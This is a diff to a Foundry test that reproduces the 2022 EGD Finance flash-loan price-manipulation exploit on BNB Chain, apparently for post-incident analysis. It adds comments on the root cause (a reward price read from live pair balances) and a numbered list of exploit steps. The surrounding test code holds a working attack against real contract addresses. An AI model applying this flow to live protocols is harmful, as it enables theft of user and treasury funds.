@@ -19,6 +19,41 @@ import "./../interface.sol";
 // Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
 // PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776
 
+// VULNERABILITY: Flashloan-enabled spot price manipulation on reward claim (EGD Finance)
+// 
+// Root Cause:
+//   - getEGDPrice() (Logic:0x93c175... L111) reads live token balances from the EGD/USDT Pancake pair:
+//       return (U.balanceOf(pair) * 1e18 / EGD.balanceOf(pair));
+//   - claimAllReward() (L240) converts accrued "quota" (USDT-time product) into EGD payout:
+//       rew += quota * 1e18 / getEGDPrice();
+//       EGD.transfer(msg.sender, rew);
+//   - NO TWAP, no Chainlink, no min/max sanity, no flashloan guard, no reentrancy guard around price use.
+//   - The pair used for price is the same permissionless AMM pair; any caller can imbalance it atomically via flash swap.
+// 
+// Why it works:
+//   - UniswapV2-style pair.swap(0, borrowUSDT, attacker, data) transfers USDT out, then synchronously invokes pancakeCall.
+//   - Inside pancakeCall (before repaying), pair's actual USDT.balanceOf is reduced while EGD.balanceOf is unchanged.
+//   - getEGDPrice() therefore returns a drastically LOWER price.
+//   - Low price => division yields massively inflated EGD reward for the pre-staked quota.
+//   - Attacker swaps extracted EGD back to USDT on router (now with restored pool or arbitrage), repays flashloans + fees, keeps profit.
+//   - All in one tx; no net capital at risk beyond tx fees/gas.
+// 
+// Exploit preconditions (all satisfied here):
+//   1. Small legitimate stake exists to create non-zero userSlot + quota (leftQuota/rates).
+//   2. Time has passed (warp) so calculateReward produces positive quota.
+//   3. Flashloan liquidity available on both the target pair and a helper pair (for initial USDT capital).
+//   4. claimAllReward has no access control beyond "has stake" + not blacklisted.
+// 
+// Impact:
+//   - Direct theft of EGD tokens from the contract's EGD balance (protocol treasury / emissions).
+//   - Realized loss reported ~$36k (attacker profit).
+//   - Price oracle corruption affects only the reward calc path in this tx; but since EGD is transferred out, permanent dilution/loss.
+//   - Any staker with accrued reward could in principle be front-run or the attacker can self-stake tiny amounts.
+// 
+// Material Harm: Attacker drains protocol EGD (valued in USDT) by abusing the price-dependent conversion inside claim; stakers' backing and protocol solvency impaired.
+// 
+// References in code: see marked sections in EGD_Finance logic (getEGDPrice + claimAllReward) and exploit flow below.
+
 IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
 IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
 IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
@@ -47,6 +82,8 @@ contract Attacker is Test {
 
         exploit.stake();
         vm.warp(1_659_914_146); // block.timestamp = 2022-08-07 23:15:46(UTC)
+        // Warp creates positive accrued quota = (ts - claimTime) * rates , capped by leftQuota.
+        // calculateAll returns the USDT-value quota; price inversion only at claim time.
 
         console.log("-------------------------------- Start Exploit ----------------------------------");
         emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
@@ -71,6 +108,12 @@ contract Exploit is Test {
     uint256 borrow2;
 
     function stake() public {
+        // Pre-work (from real attacker's prior tx): create a stake position so that:
+        // - userInfo has invitor
+        // - userSlot has rates, leftQuota >0 , claimTime set
+        // - calculateAll() will return positive value after time warp
+        // - claimAllReward() will be allowed (requires userStakeList.length > 0)
+        // Small 100 USDT stake is enough; the flash manip multiplies the EGD payout arbitrarily.
         // Give exploit contract 100 USDT
         deal(address(usdt), address(this), 100 ether);
         // Set invitor
@@ -81,6 +124,18 @@ contract Exploit is Test {
     }
 
     function harvest() public {
+        // EXPLOIT STEPS:
+        // 1. Flashloan[1]: borrow 2000 USDT from unrelated USDT/WBNB pool (provides capital to repay flash2 + fees).
+        // 2. In pancakeCall("0000"): compute borrow2 = ~99.99999925% of USDT in EGD/USDT target pair.
+        // 3. Flashloan[2]: EGD_USDT_LPPool.swap(0, borrow2, this, "00") -- this sends USDT out of the oracle pair.
+        // 4. In inner pancakeCall (else branch): 
+        //      - Observe manipulated (very low) price via getEGDPrice()
+        //      - Call claimAllReward() --> inflates EGD reward payout because of /lowPrice
+        //      - Repay flash2 with USDT+fee (same token, satisfies v2 K invariant)
+        // 5. Back in outer callback:
+        //      - Swap all received EGD -> USDT via router (profit realization)
+        //      - Repay flash1 with 2010 USDT (covers 0.25% fee)
+        // 6. Surplus USDT remains as attacker profit; EGD drained from protocol.
         console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
         borrow1 = 2000 * 1e18;
         USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
@@ -115,6 +170,7 @@ contract Exploit is Test {
                 "[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
             );
             // -----------------------------------------------------------------
+            // Critical step: claim happens while pair USDT balance is still reduced (before repay)
             console.log("Claim all EGD Token reward from EGD Finance contract");
             IEGD_Finance(EGD_Finance).claimAllReward();
             emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
@@ -126,6 +182,9 @@ contract Exploit is Test {
     }
 }
 /* -------------------- Interface -------------------- */
+
+// NOTE: These are the only methods used by the attacker. The real contract has many more (see sources/ version).
+// The vuln is NOT in the interface but in the implementation of getEGDPrice + claimAllReward that it calls.
 
 interface IEGD_Finance {
     function bond(
